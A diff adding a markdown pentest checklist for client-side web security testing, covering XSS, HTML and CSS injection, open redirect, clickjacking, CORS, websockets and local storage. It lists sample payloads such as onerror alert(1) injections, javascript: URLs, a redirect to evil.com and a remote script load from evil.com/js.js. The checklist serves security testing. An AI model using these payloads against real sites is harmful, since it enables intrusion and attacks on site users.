@@ -1,0 +1,12 @@
+- [ ] testing for DOM based cross site scripting - test for user inputs obtained from client-side javascript objects
+- [ ] testing for javascript execution - inject javascript code www.victim.com?javascript:alert(1)
+- [ ] testing for HTML injection - send malicious HTML code: ?user=\<img%20src='aaa'%20onerror=alert(1)>
+- [ ] testing for client side URL redirect - modify untrusted URL input to a malicious site (open redirect) ?redirect=www.evil.com
+- [ ] testing for CSS injection - inject code into the CSS context: •  www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera \[8,12]), www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)
+- [ ] test for client side resource manipulation - external javascript could be easily injected in the trusted web site www.victim.com/#http://evil.com/js.js
+- [ ] test CORS - check the HTTP headers in order to understand how CORS is used (origin header)
+- [ ] test for cross site flashing - decompile, undefined variables, unsafe methods, include malicious SWF http://victim/file.swf?lang=http://evil
+- [ ] test for clickjacking - discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target
+- [ ] testing websockets - identify that the application us using websockets by inspecting ws:// or wss:// URL scheme, google chromes dev tools to view the network websocket comms, check origin, confidentiality and integrity, authentication, authorization, input sanitization
+- [ ] test web messaging - analyze javascript code looking for how web messaging is implemented, how the website is restricting messages from untrusted domain and how the data is handled even for trusted domains
+- [ ] test local storage - determine whether the website is storing sensitive data in the storage, XSS in local storage http://server/storagePOC.html#<\img src=x onerror=alert(1)>
